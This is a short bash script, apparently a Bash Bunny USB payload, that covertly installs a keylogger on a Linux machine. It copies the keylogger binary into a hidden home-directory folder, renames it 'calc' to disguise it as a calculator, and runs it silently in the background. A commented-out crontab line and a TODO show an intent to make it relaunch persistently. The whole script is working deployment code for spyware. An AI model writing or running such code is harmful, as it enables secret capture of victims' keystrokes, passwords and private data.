#!/bin/bash
# hide in plain site

INSTALL_DIR="${INSTALL_DIR:-/home/$USER/.linux-calculator}"
BIN_NAME="${BIN_NAME:-calc}"
SWITCH=switch1

# path to keylogger binary can be overwritten with env variable
KEYLOGGER="${KEYLOGGER:-/media/$USER/BashBunny/payloads/$SWITCH/keylogger}"

# copy the keylogger from the BashBunny to the $INSTALL_DIR
mkdir -p "$INSTALL_DIR"
cp "$KEYLOGGER" "$INSTALL_DIR/"
mv "$INSTALL_DIR/keylogger" "$INSTALL_DIR/$BIN_NAME"
chmod +x "$INSTALL_DIR/$BIN_NAME" # make sure the bin has the right permissions 

# add crontab to start keylogger if it isn't running
# crontab -l -u $USER | echo "* * * * * bash -c \"ps -aux | grep \\\"keylogger\\\" > /dev/null 2>&1 ; if [[ \\\"\$?\\\" != \\\"0\\\" ]]; then \\\"$INSTALL_DIR/$BIN_NAME\\\" &>/dev/null & fi\"" | crontab -u $USER -

# run the logger in the background
exec "$INSTALL_DIR/$BIN_NAME" &>/dev/null &

# TODO: Add to startup scripts/crontab
